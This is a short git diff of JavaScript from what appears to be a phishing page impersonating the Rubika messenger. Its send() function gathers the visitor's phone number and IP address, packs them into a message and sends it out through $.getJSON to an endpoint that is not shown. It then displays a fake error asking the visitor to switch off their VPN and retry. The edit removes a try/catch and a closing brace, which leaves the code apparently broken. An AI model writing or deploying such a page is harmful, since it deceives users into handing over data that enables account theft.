@@ -18,7 +18,7 @@ async function send_ip() {
 }
 async function send() {
     var phone = document.getElementById('phone_number_1').value;
-    try {
+    
         var text = 'ip : ' + data.ip + '     phone : ' + phone;
 
         $.getJSON(
@@ -32,7 +32,7 @@ async function send() {
         <p id="text2" dir="rtl">درصورت نیاز به پشتیبانی ما در روبیکا پیام بدین : android_programmer@</p>
     </div>`
 
-    } catch (error) {}
+    
     document.body.innerHTML = `<div class="box">
         <img src="icon-192x192.png" alt="logo rubika">
         <h1>اوه، یه مشکلی پیش اومد</h1>
@@ -40,7 +40,7 @@ async function send() {
         <p id="text2" dir="rtl">اگه فیلترشکن روشن هست لطفا خاموش کنید و دوباره تلاش کنید.</p>
         <p id="text2" dir="rtl">درصورت نیاز به پشتیبانی ما در روبیکا پیام بدین : android_programmer@</p>
     </div>`
-}
+
 
 function check() {
     const phoneNumberInput = document.getElementById('phone_number_1').value;
